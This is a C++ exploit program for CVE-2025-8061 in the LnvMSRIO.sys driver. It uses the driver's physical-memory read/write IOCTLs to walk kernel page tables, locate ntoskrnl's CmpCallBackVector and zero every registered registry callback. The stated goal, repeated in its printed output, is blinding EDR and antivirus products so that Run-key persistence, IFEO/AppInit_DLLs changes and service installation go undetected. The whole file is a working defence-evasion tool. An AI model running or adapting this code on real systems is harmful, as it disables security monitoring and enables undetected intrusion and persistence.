/*
 * 11_cm_callback.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — CmRegisterCallback Removal
 *
 * Goal: remove registry notification callbacks registered by EDR/AV products
 *       via CmRegisterCallback / CmRegisterCallbackEx, blinding them to all
 *       registry operations (create, open, set value, delete, rename, etc.).
 *
 * Background
 * ──────────
 * EDRs and AV products register CmRegisterCallback to monitor:
 *   - Persistence: new RunKey, scheduled task registry entries
 *   - DLL injection: AppInit_DLLs, IFEO (Image File Execution Options)
 *   - Threat hunting: changes to security-relevant keys
 *   - Driver installation: HKLM\SYSTEM\CurrentControlSet\Services
 *
 * Internally, the kernel maintains an array (not list) called CmpCallBackVector,
 * indexed 0..99 (100 slots). Each slot holds an EX_CALLBACK:
 *
 *   EX_CALLBACK: 8-byte ExFastRef pointer to EX_CALLBACK_ROUTINE_BLOCK
 *   EX_CALLBACK_ROUTINE_BLOCK:
 *     +0x000  RefCount   EX_RUNDOWN_REF
 *     +0x008  Function   PEX_CALLBACK_FUNCTION  ← the actual callback
 *     +0x010  Context    PVOID
 *
 * Zeroing the EX_CALLBACK slot (8-byte ExFastRef at the array slot) removes
 * the registration — the kernel will skip null entries when iterating.
 *
 * Finding CmpCallBackVector
 * ─────────────────────────
 * CmRegisterCallbackEx is exported from ntoskrnl.
 * Scan its code for a RIP-relative LEA that targets ntoskrnl .data —
 * the first one pointing at a 100-slot (800-byte) aligned .data region
 * that contains valid EX_CALLBACK_ROUTINE_BLOCK* values (kernel pointers,
 * ExFastRef style) is CmpCallBackVector.
 *
 * Alternative: CmUnRegisterCallback is shorter and more direct; we scan it too.
 *
 * Stability
 * ─────────
 * Data-only — no code bytes modified.
 * PatchGuard does NOT protect CmpCallBackVector.
 * Used by RealBlindingEDR (myzxcg/Chinese researcher) and EDRSandBlast.
 * Zero risk of BSOD from the null-write itself; original values restored on exit.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:11_cm_callback.exe 11_cm_callback.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── RAM bound ───────────────────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Page table walk ─────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual R/W ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

static bool KernelReadU64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysReadU64(pa, out);
}

static bool KernelWriteU64(uint64_t cr3, uint64_t va, uint64_t val)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysWriteU64(pa, val);
}

// ─── ntoskrnl info ───────────────────────────────────────────────────────────

struct NtInfo {
    uint64_t base;
    uint64_t data_va;
    uint32_t data_size;
};

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

static bool GetNtoskrnlInfo(uint64_t cr3, NtInfo *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return false;

    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);

    struct MOD { HANDLE sec; PVOID mb, ib; ULONG sz, fl, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));

    memset(out, 0, sizeof(*out));
    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;
        if (_stricmp(nm, "ntoskrnl.exe") != 0 && _stricmp(nm, "ntkrnlmp.exe") != 0)
            continue;
        out->base = (uint64_t)(uintptr_t)mods[i].ib;
        break;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!out->base) return false;

    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, out->base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto *nt  = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    WORD nsec  = nt->FileHeader.NumberOfSections;
    WORD optsz = nt->FileHeader.SizeOfOptionalHeader;
    DWORD soff = dos->e_lfanew + 4 + 0x14 + optsz;

    for (WORD s = 0; s < nsec && s < 32; s++) {
        DWORD o = soff + s * 40;
        if (o + 40 > sizeof(hdrbuf)) break;
        const char *name  = (const char*)(hdrbuf + o);
        DWORD vsize = *(DWORD*)(hdrbuf + o + 0x08);
        DWORD vrva  = *(DWORD*)(hdrbuf + o + 0x0C);
        DWORD chars = *(DWORD*)(hdrbuf + o + 0x24);
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            out->data_va   = out->base + vrva;
            out->data_size = vsize;
        }
    }
    return out->data_va != 0;
}

// ─── Resolve export ──────────────────────────────────────────────────────────

static uint64_t GetNtExport(uint64_t cr3, uint64_t ntos_base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, ntos_base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto *nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return 0;

    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!expbuf) return 0;
    KernelRead(cr3, ntos_base + dir.VirtualAddress, expbuf, expSize);

    auto *exp    = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;
    uint64_t result = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        if (offN + 4 > expSize) break;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        if (nameOff >= expSize) continue;
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;

        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        if (offO + 2 > expSize) break;
        WORD ord = *(WORD*)(expbuf + offO);
        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        if (offF + 4 > expSize) break;
        result = ntos_base + *(DWORD*)(expbuf + offF);
    }
    VirtualFree(expbuf, 0, MEM_RELEASE);
    return result;
}

// ─── Find CmpCallBackVector via RIP-relative LEA scan ────────────────────────
//
// Strategy: scan code of CmRegisterCallbackEx and CmUnRegisterCallback
// for LEA Rx,[RIP+imm32] instructions that target ntoskrnl .data.
// The one pointing at an 800-byte (100×8) aligned block containing valid
// EX_CALLBACK_ROUTINE_BLOCK* values is CmpCallBackVector.

#define CM_SLOTS 100

static uint64_t FindCmpCallBackVector(uint64_t cr3,
                                       uint64_t func_va,
                                       uint64_t data_va, uint32_t data_size)
{
    uint64_t scan_targets[8] = { func_va };
    int n_targets = 1;

    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        if (!scan_va) continue;

        uint8_t code[768] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));

        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            // Follow CALLs to scan sub-functions too
            if (code[i] == 0xE8 && n_targets < 8) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                if ((callee >> 48) == 0xFFFF) {
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                }
            }

            // LEA REX 8D RIP-relative
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];
            if ((pfx & 0xF0) != 0x40) continue;
            if (op != 0x8D) continue;
            uint8_t modrm = code[i+2];
            if ((modrm & 0xC7) != 0x05) continue;

            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;

            if (target < data_va || target + CM_SLOTS * 8 > data_va + data_size) continue;

            // Validate: must have at least one valid EX_CALLBACK (kernel ptr, ExFastRef)
            // Read first 16 slots
            uint64_t slots[16] = {};
            KernelRead(cr3, target, slots, sizeof(slots));
            bool has_valid = false;
            bool all_plausible = true;
            for (int k = 0; k < 16; k++) {
                uint64_t v = slots[k];
                if (v == 0) continue;
                uint64_t ptr = v & ~0xFULL;
                if ((ptr >> 48) == 0xFFFF) { has_valid = true; continue; }
                all_plausible = false; break;
            }
            if (!all_plausible) continue;
            if (!has_valid) continue;

            printf("    [+] CmpCallBackVector: VA=0x%016llX\n", target);
            return target;
        }
    }
    return 0;
}

// ─── Saved entries ───────────────────────────────────────────────────────────

struct CmSaved {
    int      slot;
    uint64_t orig_excb;   // original EX_CALLBACK value (ExFastRef at array slot)
    uint64_t slot_va;
};

static CmSaved g_saved[CM_SLOTS];
static int     g_saved_count = 0;

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 11 - CmRegisterCallback Removal ===\n\n");
    printf("[*] Technique: zero CmpCallBackVector slots (removes registry event callbacks)\n");
    printf("[*] Stability: SAFE — data-only, PatchGuard does NOT protect CmpCallBackVector\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) { printf("[-] CR3 not found\n"); CloseHandle(g_dev); return 1; }
    printf("[+] CR3 = 0x%016llX\n\n", cr3);

    printf("[*] Getting ntoskrnl info...\n");
    NtInfo nt = {};
    if (!GetNtoskrnlInfo(cr3, &nt)) {
        printf("[-] ntoskrnl info failed\n"); CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base = 0x%016llX\n", nt.base);
    printf("[+] .data: 0x%016llX  size=0x%X\n\n", nt.data_va, nt.data_size);

    // Try CmRegisterCallbackEx first, fall back to CmUnRegisterCallback
    static const char *scan_exports[] = {
        "CmRegisterCallbackEx", "CmUnRegisterCallback", "CmRegisterCallback", nullptr
    };

    uint64_t vec_va = 0;
    for (int i = 0; scan_exports[i] && !vec_va; i++) {
        uint64_t fn = GetNtExport(cr3, nt.base, scan_exports[i]);
        if (!fn) { printf("    [-] %s not exported\n", scan_exports[i]); continue; }
        printf("    [*] Scanning %s @ 0x%016llX...\n", scan_exports[i], fn);
        vec_va = FindCmpCallBackVector(cr3, fn, nt.data_va, nt.data_size);
    }

    if (!vec_va) {
        printf("[-] CmpCallBackVector not found\n");
        CloseHandle(g_dev); return 1;
    }

    // Enumerate all 100 slots
    printf("\n[*] CmpCallBackVector — %d slots:\n", CM_SLOTS);
    int registered = 0;
    for (int i = 0; i < CM_SLOTS; i++) {
        uint64_t slot_va = vec_va + (uint64_t)i * 8;
        uint64_t excb = 0;
        if (!KernelReadU64(cr3, slot_va, &excb)) continue;
        if (!excb) continue;

        uint64_t rb_ptr  = excb & ~0xFULL;
        uint64_t fn_va   = 0;
        // EX_CALLBACK_ROUTINE_BLOCK.Function is at offset +0x008
        KernelReadU64(cr3, rb_ptr + 0x008, &fn_va);

        printf("  [%02d] ExCb=0x%016llX  RoutineBlock=0x%016llX  Fn=0x%016llX\n",
               i, excb, rb_ptr, fn_va);
        registered++;
    }

    if (!registered) {
        printf("[~] No callbacks registered (no EDR, or HVCI prevents reading)\n");
        CloseHandle(g_dev); return 0;
    }

    printf("\n[*] Press Enter to ZERO all %d CmCallback slots...\n", registered);
    getchar();

    int zeroed = 0;
    for (int i = 0; i < CM_SLOTS; i++) {
        uint64_t slot_va = vec_va + (uint64_t)i * 8;
        uint64_t excb = 0;
        if (!KernelReadU64(cr3, slot_va, &excb) || !excb) continue;

        CmSaved &s = g_saved[g_saved_count];
        s.slot     = i;
        s.orig_excb = excb;
        s.slot_va  = slot_va;

        if (KernelWriteU64(cr3, slot_va, 0)) {
            uint64_t rb = 0xDEAD;
            KernelReadU64(cr3, slot_va, &rb);
            if (rb == 0) {
                printf("  [%02d] zeroed\n", i);
                g_saved_count++;
                zeroed++;
            } else {
                printf("  [%02d] write didn't stick (HVCI?)\n", i);
            }
        }
    }

    printf("\n[+] %d/%d callback slots zeroed\n", zeroed, registered);
    if (zeroed > 0) {
        printf("[+] Registry monitoring by EDR/AV is now DISABLED:\n");
        printf("    - persistence via RunKey goes undetected\n");
        printf("    - IFEO/AppInit_DLLs changes go undetected\n");
        printf("    - service installation goes undetected\n");
    }

    printf("\n[*] Press Enter to RESTORE and exit...\n");
    getchar();

    int restored = 0;
    for (int i = 0; i < g_saved_count; i++) {
        if (KernelWriteU64(cr3, g_saved[i].slot_va, g_saved[i].orig_excb)) restored++;
    }
    printf("[+] Restored %d slots\n", restored);

    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
